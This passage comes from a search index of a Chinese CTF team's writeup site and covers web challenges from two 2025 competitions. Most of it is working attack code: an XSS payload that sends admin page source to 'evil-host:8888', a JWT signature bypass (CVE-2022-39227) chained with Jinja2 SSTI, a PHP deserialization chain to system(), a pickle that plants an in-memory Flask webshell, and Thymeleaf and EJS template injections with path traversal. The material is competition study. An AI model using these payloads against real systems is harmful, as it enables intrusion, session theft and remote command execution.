based91.decode(\"&lt;iframe/src=\\\"javascript%3Afetch%28%27%2F%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28s%3D%3E%7Bnew%20Image%28%29%2Esrc%3D%60http%3A%2F%2Fevil%2Dhost%3A8888%2Fget%5Fcookie%3Fcookie%3D%24%7BencodeURIComponent%28s%2Esubstring%280%2C2000%29%29%7D%60%7D%29%2Ecatch%28console%2Eerror%29%3B\\\"&gt;link&lt;/iframe&gt;abc\");\n\nprint(res.hex())\n\nprint(based91.encode(res))\n</code></pre> <p>iframe \u4e2d\u7684 js \u4f7f\u7528\u7684 url \u7f16\u7801\uff0c\u540c\u65f6 iframe \u548c src \u4e4b\u95f4\u4f7f\u7528 <code>/</code> \u9694\u5f00\u4ee5\u907f\u514d\u4f7f\u7528\u7a7a\u683c\uff0c\u539f\u59cb js \u4ee3\u7801\u4e3a\uff1a</p> <pre><code>javascript:fetch('/').then(r=&gt;r.text()).then(s=&gt;{new Image().src=`http://evil-host:8888/get_cookie?cookie=${encodeURIComponent(s.substring(0,2000))}`}).catch(console.error);\n</code></pre> <p>\u6267\u884c\u811a\u672c\uff1a</p> <p></p> <p>\u5728\u9875\u9762\u4e0a\u4f20\uff1a</p> <p></p> <p>\u7136\u540e\u8ba9 bot \u8bbf\u95ee\u8fd9\u4e2a\u9875\u9762\uff1a</p> <p></p> <p>\u670d\u52a1\u5668\u62ff\u5230\u7ba1\u7406\u5458\u9996\u9875\u9875\u9762\u6e90\u4ee3\u7801\uff1a</p> <p></p> <p>\u8bbf\u95ee flag \u6240\u5728 encoding\uff0c\u62ff\u5230 flag\uff1a</p> <p></p> <p> by. HuajiHD </p>"},{"location":"web/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-web/","title":"2025\u5c71\u4e1c\u7701\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b","text":"<p>\u4e24\u9053\u9898\u53ea\u51fa\u4e86\u4e00\u4e2a</p>"},{"location":"web/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-web/#web1_fix","title":"web1_fix","text":"<ol> <li> <p>JWT \u9a8c\u8bc1\u7ed5\u8fc7\u4e0e\u63d0\u6743    \u53d7\u5f71\u54cd\u7248\u672c\u7684 <code>python-jwt</code> \u4f1a\u540c\u65f6\u63a5\u53d7 JSON JWS \u4e0e compact JWS\u3002\u5c06\u4e00\u679a\u5408\u6cd5\u7b7e\u540d\u7684 compact JWT\u62c6\u6210 <code>header.payload.signature</code>\uff0c\u518d\u6784\u9020\u4e00\u4e2a JSON \u5f62\u5f0f\u7684 JWS\uff0c\u628a\u8fd9\u4e09\u4e2a\u5b57\u6bb5\u539f\u6837\u653e\u5728 <code>\"protected\"|\"payload\"|\"signature\"</code>\uff0c\u540c\u65f6\u5728 JSON \u7684\u6700\u524d\u9762\u518d\u653e\u5165\u4e00\u4e2a\u5047\u7684 compact \u7247\u6bb5\uff1a<code>\"header.fake_payload.\"</code>\u3002\u5e93\u5728\u9a8c\u7b7e\u65f6\u4f7f\u7528 JSON \u90e8\u5206\u7684\u7b7e\u540d\u901a\u8fc7\u6821\u9a8c\uff0c\u4f46\u5728\u8fd4\u56de claims \u65f6\u5374\u8bfb\u53d6\u524d\u9762\u7684\u5047 payload\uff0c\u4ece\u800c\u5b9e\u73b0\u4e0d\u6539\u7b7e\u540d\u7684 claim \u8986\u5199\uff08\u628a <code>role</code> \u63d0\u5347\u4e3a <code>admin</code>\uff09\u3002</p> </li> <li> <p>Jinja2 \u6a21\u677f\u6ce8\u5165\uff08SSTI\uff09 <code>/api/report/generate</code> \u5728 <code>template</code> \u975e\u7a7a\u65f6\u628a\u6574\u9875\u4ea4\u7ed9 <code>render_template_string</code>\u3002\u4ee3\u7801\u53ea\u5bf9 <code>template</code> \u53c2\u6570\u68c0\u67e5 <code>{{</code>\uff0c\u4f46\u672a\u8fc7\u6ee4 <code>title</code> \u4e0e\u7528\u6237\u59d3\u540d\u3002\u53ef\u5728 <code>title</code> \u6ce8\u5165\u8868\u8fbe\u5f0f\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u3002</p> </li> </ol> <p>\u6253cve-2022-39227</p> <p>https://chatgpt.com/share/e/68d76f56-8f84-8005-ad72-0a815c605052</p> <pre><code>\u2500\u2500(kali\u327fkali)-[~/Desktop/temp]\n\u2514\u2500$ BASE='http://119.45.255.233:29665'\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/temp]\n\u2514\u2500$ TOKEN=$(curl -s \"$BASE/login\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"guest\",\"password\":\"guest\"}' \\\n  | python3 -c 'import sys,json; print(json.load(sys.stdin)[\"token\"])')\necho \"$TOKEN\"\n\neyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXBhcnRtZW50IjoiZ3Vlc3QiLCJleHAiOjE3NTg5NTIxMTcsImlhdCI6MTc1ODk0NDkxNywianRpIjoiZ1hxczVVVkhJMTZYTUZ2ZlVxaTVHQSIsIm5hbWUiOiJndWVzdCIsIm5iZiI6MTc1ODk0NDkxNywicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJndWVzdCJ9.Yf8hKDyDassxe7yEmREx4Iskb5zVKSywZz4eA-aUMLc3uEOfGLejqb2vBqkzhZlBAg0h7dvtef9qsJ7M8A30mG9i-WWU1_N7A7G1X_tZLQwN1buZZ34DEIN1_XsUM52-E3bymHI-I9mRH3TGdAsGDgsG4OYe30RagjhJklLOMcxa98o76NG0dI03PUnK5gOlVwcPJbOlIpXYkQoTkwrRSsDOsnjVZEHEL3w6HDyz6qblYjeOAgbzzPny0J-HBe15VhxRvtKgf4f-9hiVCB7k8Ei7F-HI5f3qMMay2grX5P762OhVKtq4VmfDDwiBfKxPCarSdIzsOt-w0SCEiZOrWw\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/temp]\n\u2514\u2500$ python3 - \"$TOKEN\" &gt; body.json &lt;&lt;'PY'\nimport sys, json, base64\ntok = sys.argv[1]\nh,p,s = tok.split('.')\npl = json.loads(base64.urlsafe_b64decode(p + '=='))\npl.update({\"role\":\"admin\",\"username\":\"admin\"})\nfake_p = base64.urlsafe_b64encode(json.dumps(pl, separators=(',',':')).encode()).decode().rstrip('=')\npoly = '{\"%s.%s.\":\"\",\"protected\":\"%s\",\"payload\":\"%s\",\"signature\":\"%s\"}' % (h,fake_p,h,p,s)\nprint(json.dumps({\"token\": poly}))\nPY\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/temp]\n\u2514\u2500$ curl -s \"$BASE/api/verify-token\" \\\n  -H 'Content-Type: application/json' \\\n  --data-binary @body.json\n\n{\"payload\":{\"department\":\"guest\",\"exp\":1758952117,\"iat\":1758944917,\"jti\":\"gXqs5UVHI16XMFvfUqi5GA\",\"name\":\"guest\",\"nbf\":1758944917,\"role\":\"admin\",\"username\":\"admin\"},\"valid\":true}\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/temp]\n\u2514\u2500$ POLY=$(python3 -c 'import json;print(json.load(open(\"body.json\"))[\"token\"])')\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/temp]\n\u2514\u2500$ curl -s \"$BASE/api/report/generate\" \\\n  -H \"Authorization: Bearer $POLY\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n        \"company_id\": 1,\n        \"title\": \"{{ config.__class__.__init__.__globals__[\\\"os\\\"].popen(\\\"cat /flag 2&gt;/dev/null || cat /flag.txt 2&gt;/dev/null || cat /app/flag 2&gt;/dev/null || env | grep -i FLAG\\\").read() }}\",\n        \"template\": \"ok\"\n      }' | sed -n 's/.*&lt;title&gt;\\(.*\\)&lt;\\/title&gt;.*/\\1/p'\nflag{2b85a02b4f6d0f49ca05f766c68ff506}\\n\n</code></pre>"},{"location":"web/%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B-web/#web2","title":"web2\uff08\u4ec5\u6709\u6e90\u7801\uff09","text":"<pre><code>&lt;?php\nerror_reporting(0);\nsession_start();\nshow_source(__FILE__);\n\nclass DatabaseWork\n{\n    public $hostname = \"localhost\";\n    public $dbuser = \"root\";\n    public $dbpass = \"root\";\n    public $database;\n\n    public function __construct($database)\n    {\n        $this-&gt;database = $database;\n    }\n    public function __wakeup() {\n        if ($this-&gt;hostname === 'localhost') {\n            echo \"connect to \" . $this-&gt;database;\n        }\n    }\n}\n\nclass DatabaseConnectHandle\n{\n    public $connect;\n    public $params;\n    public function __construct()\n    {\n        $this-&gt;connect = array(\"127.0.0.1\",\"root\",\"root\");\n    }\n    public function __toString()\n    {\n        return $this-&gt;getfunction();  \n    }\n    public function getfunction()\n    {\n        $func = $this-&gt;params;\n        $func();\n        return \"config\";\n    }\n}\n\nclass ConfigFileUploader {\n    public function __invoke(){\n        if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {\n            exit('upload error');\n        }\n        $file = $_FILES['file'];\n        $fileName = basename($file['name']);\n        $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));\n\n        if (!in_array($fileExt, ['ini'])) {\n            exit('only config.ini');\n        }\n\n        $fileContent = file_get_contents($file['tmp_name']);\n\n        if (strpos($fileContent, '&lt;') !== false) {\n            exit('No hacker !');\n        }\n\n        $destination = \"/tmp/\". $fileName;\n        if (move_uploaded_file($file['tmp_name'], $destination)) {\n            exit($destination);\n        }\n        exit(\"upload failed\");\n    }\n}\n\nclass ConfigFileviewer {\n\n    public $path;\n\n    public function __invoke(){\n        return $this-&gt;includeFile($this-&gt;path); \n    }\n    public function includeFile($path) {\n        if (preg_match('/filter|log|flag|proc|root|\\.\\.|home/i',$path)){\n            exit(\"No !\");\n        }\n        include \"/tmp/\".basename($path);\n    }\n}\n\n\n\n$data = $_GET['data'];\nif (preg_match(\"/flag|zip|base|read|zlib|rot|string|code/i\",$data)){\n    exit(\"No hack!\");\n}\nfile_put_contents($data,file_get_contents($data));\n</code></pre> <p> by. HuajiHD </p>"},{"location":"web/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Web/","title":"\u7f8a\u57ce\u676f2025 Web","text":""},{"location":"web/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Web/#2025-web","title":"\u7f8a\u57ce\u676f2025-Web","text":"<p>\u9898\u76ee\u611f\u89c9\u51fa\u7684\u4e0d\u9519\uff0c\u5f88\u6709\u610f\u601d\uff0c\u4f46\u505a\u8d77\u6765\u6709\u70b9\u7262</p>"},{"location":"web/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Web/#ez_unserialize","title":"ez_unserialize","text":"<p>\u601d\u8def\uff1a<code>H-&gt;__destruct()</code> \u2192 <code>A::start()</code> \u56de\u663e <code>$a-&gt;next</code>\uff0c\u8ba9\u5b83\u662f <code>V</code>\u3002  <code>V::__toString()</code> \u53d6 <code>$this-&gt;go-&gt;$abc</code>\uff0c\u8bbe <code>$abc='secret'</code> \u4e14 <code>go=E</code> \u89e6\u53d1 <code>E::__get()</code> \u2192 <code>$found-&gt;check()</code>\u3002  <code>F::check()</code> \u91cc <code>finalstep='u'</code>\uff08\u5c0f\u5199\u7ed5\u8fc7 <code>/U/</code>\uff09\uff0c\u5b9e\u4f8b\u5316 <code>new u()</code> \u5b9e\u9645\u62ff\u5230\u7c7b <code>U</code>\uff0c\u518d <code>($this-&gt;step)()</code> \u89e6\u53d1 <code>U::__invoke()</code> \u2192 \u8c03 <code>N::__call()</code> \u2192 <code>call_user_func('system', $_POST['cmd'])</code>\u3002</p> <p>\u7528\u540c\u540d\u7c7b\u6784\u9020\u94fe\uff0cPOST \u4e24\u4e2a\u53c2\u6570\uff1a<code>payload</code> \u548c <code>cmd=cat /flag</code>\u3002</p> <p>\u6240\u4ee5\u5199\u811a\u672c\uff1a</p> <pre><code>&lt;?php\nclass A { public $first; public $step; public $next; }\nclass E { private $you; public $found; private $secret; }\nclass F { public $fifth; public $step; public $finalstep; }\nclass H { public $who; public $are; public $you; }\nclass V { public $good; public $keep; public $dowhat; public $go; }\n\n$v = new V();\n$v-&gt;dowhat = 'secret';\n$e = new E();\n$f = new F();\n$f-&gt;finalstep = 'u';\n$e-&gt;found = $f;\n$v-&gt;go = $e;\n\n// A::start() echo $this-&gt;next \u89e6\u53d1 V::__toString\n$a = new A();\n$a-&gt;next = $v;\n$h = new H();\n$h-&gt;who = $a;\n\n\n$payload = serialize($h);\n\necho urlencode($payload);\n</code></pre> <p>\u8dd1\u5b8c\u751f\u6210payload\uff0c\u518d\u4f20\u4e0acmd\u53c2\u6570</p> <pre><code>payload=O%3A1%3A%22H%22%3A3%3A%7Bs%3A3%3A%22who%22%3BO%3A1%3A%22A%22%3A3%3A%7Bs%3A5%3A%22first%22%3BN%3Bs%3A4%3A%22step%22%3BN%3Bs%3A4%3A%22next%22%3BO%3A1%3A%22V%22%3A4%3A%7Bs%3A4%3A%22good%22%3BN%3Bs%3A4%3A%22keep%22%3BN%3Bs%3A6%3A%22dowhat%22%3Bs%3A6%3A%22secret%22%3Bs%3A2%3A%22go%22%3BO%3A1%3A%22E%22%3A3%3A%7Bs%3A6%3A%22%00E%00you%22%3BN%3Bs%3A5%3A%22found%22%3BO%3A1%3A%22F%22%3A3%3A%7Bs%3A5%3A%22fifth%22%3BN%3Bs%3A4%3A%22step%22%3BN%3Bs%3A9%3A%22finalstep%22%3Bs%3A1%3A%22u%22%3B%7Ds%3A9%3A%22%00E%00secret%22%3BN%3B%7D%7D%7Ds%3A3%3A%22are%22%3BN%3Bs%3A3%3A%22you%22%3BN%3B%7D&amp;cmd=cat /flag\n</code></pre> <p></p> <p>\u4f46\u95eeai\u7684\u66f4\u77ed</p> <pre><code>payload=O%3A1%3A%22H%22%3A1%3A%7Bs%3A3%3A%22who%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22next%22%3BO%3A1%3A%22V%22%3A2%3A%7Bs%3A6%3A%22dowhat%22%3Bs%3A6%3A%22secret%22%3Bs%3A2%3A%22go%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A5%3A%22found%22%3BO%3A1%3A%22F%22%3A1%3A%7Bs%3A9%3A%22finalstep%22%3Bs%3A1%3A%22u%22%3B%7D%7D%7D%7D%7D\n&amp;cmd=cat%20/flag\n</code></pre>"},{"location":"web/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Web/#ez-blog","title":"ez-blog","text":"<p>\u63d0\u793a<code>\u8bbf\u5ba2\u53ea\u80fd\u7528\u8bbf\u5ba2\u8d26\u53f7\u767b\u5f55\u54e6\uff01</code>\uff0c\u5148\u7528guest/guest\u767b\u5f55\uff0c\u53d1\u73b0\u5206\u914d\u4e86\u4e00\u4e2atoken\uff1a<code>8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e</code></p> <p>\u6240\u4ee5\u5148\u60f3\u5230\u4f2a\u9020\uff0c\u767b\u5f55\u4e0aadmin</p> <pre><code>import binascii\n\nhexs = \"8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e\"\ndata = binascii.unhexlify(hexs)\n\n# \u5c06 b\"\\x8c\\x08is_admin\\x94\\x89\" \u4e2d\u7684 0x89 -&gt; 0x88\nold = b\"\\x8c\\x08is_admin\\x94\\x89\"\nnew = b\"\\x8c\\x08is_admin\\x94\\x88\"\nassert old in data, \"\u672a\u627e\u5230 is_admin=False \u7247\u6bb5\"\nforged = data.replace(old, new, 1)\n\nprint(binascii.hexlify(forged).decode())\n#8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94888c096c6f676765645f696e948875622\n</code></pre> <p>\u6d4b\u8bd5\u53d1\u73b0blog\u4e2d\u4e0d\u5b58\u5728ssti\uff0c\u53ea\u80fd\u6253\u5185\u5b58\u9a6c</p> <p>\u601d\u8def\uff1a\u53d6 404 \u7684\u5f02\u5e38\u7c7b\u4e0e\u72b6\u6001\u7801\uff1a<code>app._get_exc_class_and_code(404)</code></p> <p>\u5c06 Flask \u7684 404 \u9519\u8bef\u5904\u7406\u5668\u6539\u5199\u4e3a\uff1a<code>lambda a: __import__('os').popen(request.args.get('huaji')).read()</code></p> <pre><code>import binascii,pickle\n\nclass ys():\n    def __reduce__(self):\n        return (exec,(\"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('ys')).read()\",))\n\npayload=pickle.dumps(ys())\nprint(binascii.hexlify(payload))\n#b'800495da000000000000008c086275696c74696e73948c04657865639493948cbe676c6f62616c206578635f636c6173733b676c6f62616c20636f64653b6578635f636c6173732c20636f6465203d206170702e5f6765745f6578635f636c6173735f616e645f636f646528343034293b6170702e6572726f725f68616e646c65725f737065635b4e6f6e655d5b636f64655d5b6578635f636c6173735d203d206c616d62646120613a5f5f696d706f72745f5f28276f7327292e706f70656e28726571756573742e617267732e676574282779732729292e72656164282994859452942e'\n</code></pre> <p>\u5728\u7ad9\u70b9\u4f20\u51e0\u6b21token</p> <p></p> <p>\u8bbf\u95ee\u4efb\u610f\u89e6\u53d1 404 \u7684 URL\uff0c\u5e76\u5728\u67e5\u8be2\u53c2\u6570\u91cc\u5e26\u4e0a <code>huaji=\u547d\u4ee4</code>\uff0c\u5c31\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u8be5\u547d\u4ee4</p> <p></p> <p></p>"},{"location":"web/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Web/#authweb","title":"authweb","text":"<p>\u5148\u4f2a\u9020jwt\uff0c\u9006\u5411\u5206\u6790\u5f97\u77e5\u6709\u4e24\u4e2a\u7528\u6237<code>user1</code>\u548c<code>admin</code>\uff0c</p> <p></p> <p>\u800c<code>ROLE_USER</code>\u6743\u9650\u624d\u80fd\u6587\u4ef6\u4e0a\u4f20\uff0c\u6240\u4ee5\u7528<code>user1</code></p> <p></p> <p><code>secret</code>\u53ef\u4ee5\u5728<code>JwtTokenProvider.class</code>\u91cc\u9762\u62ff</p> <p></p> <p>\u5199\u811a\u672c\u751f\u6210\u4e00\u4e2ajwt</p> <pre><code>import jwt, time\nsecret = \"25d55ad283aa400af464c76d713c07add57f21e6a273781dbf8b7657940f3b03\"\nnow = int(time.time())\npayload = {\n    \"sub\": \"user1\"\n}\ntok = jwt.encode(payload, secret, algorithm=\"HS256\")\nprint(tok)\n# eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.sFqXJja3YmLPT2ULrh0wnb-8HmGT13qSRUVs9-1rNCw\n</code></pre> <p>\u4e4b\u540ecurl\u6d4b\u8bd5\uff0c</p> <pre><code>curl -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.sFqXJja3YmLPT2ULrh0wnb-8HmGT13qSRUVs9-1rNCw\" http://45.40.247.139:15040/upload\n</code></pre> <p>\u8fd4\u56de405\uff0c\u6216\u8005\u4f7f\u7528OPTIONS \u8bf7\u6c42\uff0c\u90fd\u8bf4\u660e\u6b64\u5904\u5e94\u5f53post\u4e0a\u4f20\u6587\u4ef6\uff0c\u6240\u4ee5\u8003\u8651thymeleaf\u6a21\u677f\u6ce8\u5165\uff0c\u6b64\u5904\u8def\u5f84\u7ecf\u8fc7\u591a\u6b21fuzz\uff08ps\uff1a\u5f53\u65f6\u597d\u50cf\u56e0\u4e3a\u6e32\u67d3\u95ee\u9898\u4e00\u76f4\u62a5\u9519\uff09\u3002</p> <p>\u4f20\u6a21\u677f</p> <p>\u4f20\u4e86\u5e26Thymeleaf\u7684\uff0c\u53ef\u4ee5\u52a0\u8f7d\uff0c\u8bc1\u660e\u5b58\u5728</p> <pre><code>&lt;table&gt;\n  &lt;thead&gt;\n    &lt;tr&gt;\n      &lt;th th:text=\"#{msgs.headers.name}\"&gt;Name&lt;/th&gt;\n      &lt;th th:text=\"#{msgs.headers.price}\"&gt;Price&lt;/th&gt;\n    &lt;/tr&gt;\n  &lt;/thead&gt;\n  &lt;tbody&gt;\n    &lt;tr th:each=\"prod: ${allProducts}\"&gt;\n      &lt;td th:text=\"${prod.name}\"&gt;Oranges&lt;/td&gt;\n      &lt;td th:text=\"${#numbers.formatDecimal(prod.price, 1, 2)}\"&gt;0.99&lt;/td&gt;\n    &lt;/tr&gt;\n  &lt;/tbody&gt;\n&lt;/table&gt;\n</code></pre> <p>\u6240\u4ee5\u6700\u540e\u5199\u6587\u4ef6</p> <p>payload.html</p> <pre><code>&lt;pre th:each=\"e : ${@environment.getSystemEnvironment().entrySet()}\"\nth:text=\"${e.key + '=' + e.value}\"&gt;123&lt;/pre&gt;\n</code></pre> <p>\u4f20\u6587\u4ef6</p> <pre><code>curl -F \"imgName=../../tmp/yui\" -F \"imgFile=@payload.html;type=text/html\" -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.sFqXJja3YmLPT2ULrh0wnb-8HmGT13qSRUVs9-1rNCw\" -v http://45.40.247.139:23951/upload\n\n\u8bbf\u95ee\nhttp://45.40.247.139:23951/login/dynamic-template?value=file:../../../../tmp/yui\n\ncurl -H \"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.sFqXJja3YmLPT2ULrh0wnb-8HmGT13qSRUVs9-1rNCw\" http://45.40.247.139:23951/login/dynamic-template?value=file:../../../../tmp/yui\n</code></pre> <p></p>"},{"location":"web/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Web/#staticnodeservice","title":"staticNodeService","text":"<p>\u6839\u636e\u9898\u76ee\u5f97\u51fa\u6ee1\u8db3</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    FILE *file;\n    int c;\n\n    file = fopen(\"/flag\", \"r\");\n    while ((c = fgetc(file)) != EOF) {\n        putchar(c);\n    }\n    fclose(file);\n\n    return 0;\n}\n</code></pre> <p>\u624d\u5f97flag\u3001</p> <p>\u4e4b\u540e\u7ee7\u7eed\u5206\u6790</p> <p></p> <p>App.js\u53ef\u4ee5\u770b\u5230\u4e24\u4e2a\u91cd\u8981\u53c2\u6570\uff1atempl\uff0creq.body.content</p> <p>templ\u7684\u529f\u80fd\u5c31\u662f\u51b3\u5b9a\u4f7f\u7528\u54ea\u4e2aEJS\u6a21\u677f\u6e32\u67d3\u9875\u9762\uff0c\u9ed8\u8ba4\u662findex</p> <p>\u800ccontent\u529f\u80fd\u5c31\u662f\u6587\u4ef6\u4e0a\u4f20\u5185\u5bb9\uff08base64\u7f16\u7801\uff09</p> <p>\u8fd9\u91cc\u5c31\u60f3\u5230\u4e86node.js\u6ce8\u5165</p> <p>\u76f8\u5173\u53c2\u8003</p> <p>Node.js \u5e38\u89c1\u6f0f\u6d1e\u5b66\u4e60\u4e0e\u603b\u7ed3-\u5148\u77e5\u793e\u533a</p> <p>\u5c1d\u8bd5node.js\u6ce8\u5165</p> <pre><code>&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;%- global.process.mainModule.require('child_process').execSync('/readflag') %&gt;\n&lt;/ul&gt;\n&lt;hr&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Base64\u7f16\u7801\u7ed5</p> <p>~~~ PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvc3RyaWN0LmR0ZCI+CjxodG1sPgo8aGVhZD4KPCUtIGdsb2JhbC5wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCcvcmVhZGZsYWcnKSAlPgo8L3VsPgo8aHI+CjwvYm9keT4KPC9odG1sPgo8L2h0bWw+  ~~~</p> <p>\u6293\u5305\u5728views\u4e0b\u9762\u4f20\u5305\uff0ccontent\u6ce8\u5165\u522b\u5fd8\u4e86\u5c06\u8bf7\u6c42\u5934\u6539\u6210PUT</p> <p>poc\uff1a </p> <pre><code>PUT /views/jumao.ejs/. HTTP/1.1\nHost: 45.40.247.139:20306\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Core/1.116.554.400 QQBrowser/19.5.6663.400\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: Token=8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e\nContent-Type: application/json\nIf-None-Match: W/\"273-if8cs80g9cADhHskk2Pvb4OoltU\"\nConnection: keep-alive\nContent-Length: 754\n\n{\"content\":\"PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvc3RyaWN0LmR0ZCI+CjxodG1sPgo8aGVhZD4KPCUtIGdsb2JhbC5wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCcvcmVhZGZsYWcnKSAlPgo8L3VsPgo8aHI+CjwvYm9keT4KPC9odG1sPgo8L2h0bWw+\"}\n</code></pre> <p></p> <p>\u7136\u540e\u6839\u636etempl \u4f20\u53c2</p> <pre><code>http://45.40.247.139:20306/?templ=jumao.ejs\n</code></pre> <p></p> <p> by. HuajiHD </p>"},{"location":"%E5%B8%AE%E5%8A%A9/Writeup%E7%BC%96%E5%86%99%E8%A7%84%E8%8C%83/","title":"Writeup\u7f16\u5199\u89c4\u8303","text":"<p>Markdown \u662f\u4e00\u79cd\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\uff0c\u7528\u7b80\u5355\u76f4\u89c2\u7684\u7b26\u53f7\u5c31\u80fd\u5b9e\u73b0\u6807\u9898\u3001\u5217\u8868\u3001\u94fe\u63a5\u3001\u4ee3\u7801\u7b49\u6392\u7248\u6548\u679c\uff0c\u5b83\u8bed\u6cd5\u6613\u5b66\u3001\u8de8\u5e73\u53f0\u901a\u7528\u3001\u6587\u4ef6\u662f\u7eaf\u6587\u672c\u4fbf\u4e8e\u7248\u672c\u7ba1\u7406\uff0c\u5e76\u4e14\u80fd\u65b9\u4fbf\u5730\u8f6c\u6362\u6210 HTML\u3001PDF \u7b49\u591a\u79cd\u683c\u5f0f\uff0c\u56e0\u6b64\u65e2\u80fd\u8ba9\u4f5c\u8005\u4e13\u6ce8\u5185\u5bb9\u521b\u4f5c\uff0c\u53c8\u80fd\u5feb\u901f\u5f97\u5230\u7f8e\u89c2\u3001\u7ed3\u6784\u6e05\u6670\u7684\u6587\u6863\u3002</p>"},{"location":"%E5%B8%AE%E5%8A%A9/Writeup%E7%BC%96%E5%86%99%E8%A7%84%E8%8C%83/#_1","title":"\u8981\u6c42&amp;\u6ce8\u610f\u4e8b\u9879","text":"<ol> <li> <p>\u8be5\u9759\u6001\u7f51\u7ad9\u4f7f\u7528 mkdocs \u5de5\u5177\u751f\u6210\uff0cWriteup\u5fc5\u987b\u4f7f\u7528 md \u6587\u4ef6\u7f16\u5199\uff0c\u5173\u4e8e markdown \u8bed\u6cd5\u53ef\u4ee5\u81ea\u884c\u641c\u7d22\u5b66\u4e60\uff0c\u4e94\u5206\u949f\u5de6\u53f3\u4fbf\u53ef\u638c\u63e1\u57fa\u672c\u8bed\u6cd5\uff0c\u53ea\u9700\u4f1a\u591a\u7ea7\u6807\u9898\u3001\u56fe\u7247\u94fe\u63a5\u3001\u591a\u7ea7\u5217\u8868\u5373\u53ef\u3002</p> </li> <li> <p>\u7f16\u5199\u7684 md \u6587\u4ef6\u9700\u8981\u901a\u8fc7 <code>lint-md</code> \u8fdb\u884c\u8bed\u6cd5\u6821\u9a8c\uff0c\u8be5\u6b65\u9aa4\u672a\u6765\u4f1a\u8003\u8651\u52a0\u5165 github workflow \u81ea\u52a8\u5ba1\u67e5\uff0c\u76ee\u524d\u4f60\u53ea\u9700\u8981\u4fdd\u8bc1\u4f60\u7684 md \u7f16\u8f91\u5668\u80fd\u6b63\u786e\u6e32\u67d3\u5c31\u884c\u3002</p> </li> <li> <p>\u65e0\u987b\u6dfb\u52a0\u7f72\u540d\uff0c\u7f51\u7ad9\u4f1a\u6839\u636e\u4f60\u7684 github 